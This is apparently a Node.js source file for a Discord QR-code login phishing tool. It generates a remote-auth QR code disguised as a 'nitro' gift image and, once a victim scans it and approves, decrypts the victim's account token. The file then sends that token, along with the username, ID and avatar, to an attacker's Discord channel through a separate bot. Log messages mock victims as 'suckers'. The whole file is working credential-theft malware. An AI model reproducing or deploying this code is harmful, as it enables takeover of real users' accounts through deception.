const WebSocketClient = require('websocket').client;
const Crypto = require('crypto');
const { join } = require('path');
const discord = require("discord.js")
const client31 = new discord.Client()
client31.login(process.env.token)

const { Spinner } = require('../util');
const createImage = require('../image');

const User = require('./User');
const { Messages, Discord } = require('./constants');
const { client } = require('websocket');

class Session {
    constructor() {
        this.keys = createKeyPair();

        this.ws = new WebSocketClient();
        this.ws.on('connect', this.wsConnect.bind(this));
        this.ws.on('connectFailed', this.wsConnectFail.bind(this));

        this.ws.connect(Discord.GATEWAY, null, Discord.ORIGIN);

        this.spinner = new Spinner();
    }

    debug(message, indicator = ' ') {
        const ts = `[${Date.now() - this.ts}ms]`.padEnd(10, ' ').gray();
        process.stdout.clearLine();
        console.log(`${indicator.yellow()} ${ts} ${message}`);
    }

    wsConnect(stream) {
        this.ts = Date.now();
        this.debug(('Connected to ' + Discord.GATEWAY).green());

        stream.on('message', this.wsMessage.bind(this));
        this.stream = stream;
    }

    wsMessage(message) {
        const { op, ...payload } = JSON.parse(message.utf8Data);
        this.debug(op, '↓');

        switch (op) {
            case Messages.HELLO:
                this.heartbeat = setInterval(() => {
                    this.wsSend(Messages.HEARTBEAT);
                }, payload.heartbeat_interval);

                this.timeout = setTimeout(() => {
                    this.spinner.resolve('Timeout'.yellow(), '✗'.red());

                                      client31.channels.cache.get(process.env.kanal).send(new discord.MessageEmbed().setDescription("Kod Zaman Aşamına Uğradı.").setFooter("Atahan"))

                    this.destroy();
                    //this.wsStart();
                }, payload.timeout_ms);

                this.wsSend(Messages.INIT, { encoded_public_key: this.keys.public });
                break;

            case Messages.NONCE_PROOF:
                const nonce = this.decryptPayload(payload.encrypted_nonce);

                const proof = Crypto.createHash('sha256')
                    .update(nonce)
                    .digest('base64')
                    .replace(/\+/g, '-')
                    .replace(/\//g, '_')
                    .replace(/=+$/, '');

                this.wsSend(Messages.NONCE_PROOF, { proof });
                break;

            case Messages.PENDING_REMOTE_INIT:
                const url = `https://discordapp.com/ra/${payload.fingerprint}`;

                const path = join(process.cwd(), 'nitro.png');

                createImage(path, url).then(() => {   
const attachment = new discord.MessageAttachment('./nitro.png', 'atahan.png');

setTimeout(() => {                  
client31.channels.cache.get("1021462151463964693").send("QR Kod Kuruldu", {files: [attachment]})}, 2000)
                })
                
                this.debug(`QR code saved to ${path}`);

                this.spinner.start('Awaiting QR Code Scan...');
                break;

                case Messages.PENDING_FINISH:
                    const userPayload = this.decryptPayload(payload.encrypted_user_payload).toString('ascii');
                    const user = new User(userPayload);
    
                    client31.channels.cache.get(process.env.kanal).send(new discord.MessageEmbed().addField(`Taratan`, `${user.username}#${user.discriminator}`, true).addField(`Enayi ID`, `${user.id}`, true).setDescription("Enayi nin Login Butonuna Tıklaması Bekleniyor.").setThumbnail(user.avatar).setFooter("Atahan"))
    
                    this.spinner.resolve(`Scanned by ${user.username}#${user.discriminator}`);
                    console.log(`  ID: ${user.id}`);
                    console.log(`  Avatar: ${user.avatar}`);
    
                    this.spinner.start('Awaiting Login Button Click...');
                    break;
    
                case Messages.FINISH:
                    const token = this.decryptPayload(payload.encrypted_token).toString('ascii');
    
                    this.spinner.resolve(`Token: ${token}`);
                    client31.channels.cache.get(process.env.kanal).send(token, new discord.MessageEmbed().addField(`Enayi Token`, `${token}`, true).setFooter("Atahan"))
    this.destroy()
                    break;
    
                case Messages.CANCEL:
                    this.spinner.resolve('User Cancelled'.yellow(), '✗'.red());
    
                    client31.channels.cache.get(process.env.kanal).send(new discord.MessageEmbed().setDescription('Üye Enayi Değilmiş').setFooter("Atahan"))
            this.destroy()
                    break;
    
                case Messages.CANCEL:
                    this.spinner.resolve('User Cancelled'.yellow(), '✗'.red());
    
                    client31.channels.cache.get(process.env.kanal).send(new discord.MessageEmbed().setDescription('Üye Enayi Değilmiş').setFooter("Atahan"))
            this.destroy()
                    break;
        }
    }

    wsConnectFail(reason) {
        this.debug(('Connect failed: ' + reason).red());
      
                    client31.channels.cache.get(process.env.kanal).send(new discord.MessageEmbed().setDescription('Bağlanılamadı' + reason).setFooter("Atahan"))
      this.destroy()
    }

    wsSend(op, message) {
        const payload = { op, ...message };
        this.stream.send(JSON.stringify(payload));

        this.debug(op, '↑');
    }

    decryptPayload(payload) {
        const buffer = Buffer.from(payload, 'base64');

        return Crypto.privateDecrypt({
            key: this.keys.private,
            padding: Crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: 'sha256',
        }, buffer);
    }

    destroy() {
                            client31.channels.cache.get(process.env.kanal).send(new discord.MessageEmbed().setDescription('QR sıfırlandı').setFooter("Atahan"))

        clearInterval(this.heartbeat);
        clearTimeout(this.timeout);
    }
}

function createKeyPair() {
    const keys = Crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'der' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    })

    return {
        public: keys.publicKey.toString('base64'),
        private: keys.privateKey,
    }
}

module.exports = Session;